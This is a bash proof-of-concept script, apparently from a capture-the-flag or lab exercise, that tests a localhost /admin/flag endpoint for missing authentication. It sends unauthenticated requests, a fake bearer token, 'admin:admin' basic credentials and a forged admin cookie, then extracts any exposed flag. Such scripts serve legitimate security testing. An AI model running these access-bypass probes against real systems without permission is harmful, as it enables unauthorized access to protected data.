#!/bin/bash

# POC: Missing Authentication and Authorization on /admin/flag Endpoint
# This script demonstrates critical unauthorized access to admin flag data

TARGET="http://localhost:8080/admin/flag"
RESULTS_FILE="/tmp/admin_flag_poc_results.txt"

echo "========================================"
echo "POC: Missing Auth on /admin/flag"
echo "========================================"
echo ""

# Test 1: Direct unauthenticated access
echo "[TEST 1] Direct unauthenticated access"
echo "Command: curl -i $TARGET"
RESPONSE=$(curl -i "$TARGET" 2>/dev/null)
echo "$RESPONSE" >> "$RESULTS_FILE"
HTTP_CODE=$(echo "$RESPONSE" | head -n 1 | grep -oP '\d{3}')
if echo "$RESPONSE" | grep -q "flag{"; then
    echo "✓ VULNERABLE: Received flag without authentication"
    echo "HTTP Status: $HTTP_CODE"
    echo "Flag found in response"
    echo ""
else
    echo "✗ Not vulnerable or endpoint not responding"
    echo ""
fi

# Test 2: Access with invalid Bearer token
echo "[TEST 2] Access with invalid Bearer token"
echo "Command: curl -i -H \"Authorization: Bearer invalid_token\" $TARGET"
RESPONSE=$(curl -i -H "Authorization: Bearer invalid_token" "$TARGET" 2>/dev/null)
echo "$RESPONSE" >> "$RESULTS_FILE"
HTTP_CODE=$(echo "$RESPONSE" | head -n 1 | grep -oP '\d{3}')
if echo "$RESPONSE" | grep -q "flag{"; then
    echo "✓ VULNERABLE: Invalid token ignored, flag still accessible"
    echo "HTTP Status: $HTTP_CODE"
    echo ""
else
    echo "✗ Token validation in place or endpoint not responding"
    echo ""
fi

# Test 3: Access with Basic auth
echo "[TEST 3] Access with Basic auth credentials"
echo "Command: curl -i -H \"Authorization: Basic admin:admin\" $TARGET"
RESPONSE=$(curl -i -H "Authorization: Basic admin:admin" "$TARGET" 2>/dev/null)
echo "$RESPONSE" >> "$RESULTS_FILE"
HTTP_CODE=$(echo "$RESPONSE" | head -n 1 | grep -oP '\d{3}')
if echo "$RESPONSE" | grep -q "flag{"; then
    echo "✓ VULNERABLE: Basic auth credentials ignored, flag still accessible"
    echo "HTTP Status: $HTTP_CODE"
    echo ""
else
    echo "✗ Auth validation in place or endpoint not responding"
    echo ""
fi

# Test 4: Access with query parameters
echo "[TEST 4] Access with query parameters"
echo "Command: curl -i \"$TARGET?user=admin&id=1\""
RESPONSE=$(curl -i "$TARGET?user=admin&id=1" 2>/dev/null)
echo "$RESPONSE" >> "$RESULTS_FILE"
HTTP_CODE=$(echo "$RESPONSE" | head -n 1 | grep -oP '\d{3}')
if echo "$RESPONSE" | grep -q "flag{"; then
    echo "✓ VULNERABLE: Query parameters ignored, flag still accessible"
    echo "HTTP Status: $HTTP_CODE"
    echo ""
else
    echo "✗ Endpoint not responding or already secured"
    echo ""
fi

# Test 5: Access with cookies
echo "[TEST 5] Access with cookie manipulation"
echo "Command: curl -i -H \"Cookie: admin=true\" $TARGET"
RESPONSE=$(curl -i -H "Cookie: admin=true" "$TARGET" 2>/dev/null)
echo "$RESPONSE" >> "$RESULTS_FILE"
HTTP_CODE=$(echo "$RESPONSE" | head -n 1 | grep -oP '\d{3}')
if echo "$RESPONSE" | grep -q "flag{"; then
    echo "✓ VULNERABLE: Cookie manipulation ignored, flag still accessible"
    echo "HTTP Status: $HTTP_CODE"
    echo ""
else
    echo "✗ Cookie validation in place or endpoint not responding"
    echo ""
fi

# Summary
echo "========================================"
echo "SUMMARY"
echo "========================================"
FIRST_RESPONSE=$(curl -s "$TARGET" 2>/dev/null)
if echo "$FIRST_RESPONSE" | grep -q "flag{"; then
    FLAG_VALUE=$(echo "$FIRST_RESPONSE" | grep -oP 'flag{\K[^}]+' | head -1)
    echo "✓ ENDPOINT IS VULNERABLE"
    echo "Sensitive flag exposed: flag{$FLAG_VALUE}"
    echo "Status: Unauthenticated users can access admin resources"
    echo "Severity: CRITICAL - Complete authorization bypass"
    exit 0
else
    echo "✗ Endpoint not accessible or already secured"
    exit 1
fi